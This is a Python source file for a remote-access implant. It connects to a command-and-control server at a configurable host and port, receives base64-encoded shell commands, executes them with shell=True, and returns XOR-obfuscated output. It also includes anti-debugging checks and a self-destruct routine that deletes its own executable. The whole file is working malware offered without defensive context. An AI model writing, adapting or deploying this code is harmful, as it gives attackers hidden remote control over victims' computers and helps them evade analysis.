import socket
import subprocess
import base64
import threading
import os
import sys

def is_debugger_present():
    # This is a simple and basic check, might not detect all debuggers
    try:
        import ctypes
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except AttributeError:
        return False

def execute_command(cmd):
    def target():
        try:
            # Directly run the command without timeout parameter in subprocess
            nonlocal output
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        except subprocess.CalledProcessError as e:
            output = str(e.output)
    
    output = "Command took too long to execute"
    thread = threading.Thread(target=target)
    thread.start()

    # Wait for the command to complete or timeout after 10 seconds
    thread.join(timeout=10)
    if thread.is_alive():
        thread.join()  # Ensure cleanup if still running
    return output

def send_all(sock, data):
    xor_encoded_data = ''.join(chr(ord(c) ^ 0x20) for c in data)
    data_length = str(len(xor_encoded_data)).zfill(10)
    sock.send(data_length.encode() + xor_encoded_data.encode())

def self_destruct():
    # Add cleanup actions here (e.g., delete files, clear logs)
    print("Self-destruct sequence initiated.")
    try:
        # Attempt to delete the executable
        os.remove(sys.argv[0])
    except Exception as e:
        print(f"Failed to self-destruct: {e}")
    finally:
        sys.exit()

def main():
    host = '127.0.0.1'
    port = 9999
    
    if is_debugger_present():
        print("Debugger detected, initiating self-destruct.")
        self_destruct()

    with socket.socket() as s:
        s.connect((host, port))
        print("Connected to C2 server at {}:{}".format(host, port))
        
        while True:
            encoded_cmd = s.recv(4096).decode().strip()
            if not encoded_cmd:
                break

            cmd = base64.b64decode(encoded_cmd).decode()
            if cmd == "self-destruct":
                self_destruct()

            print("Received command:", cmd)
            output = execute_command(cmd)
            print("Sending output:", output)
            send_all(s, output)

if __name__ == '__main__':
    main()
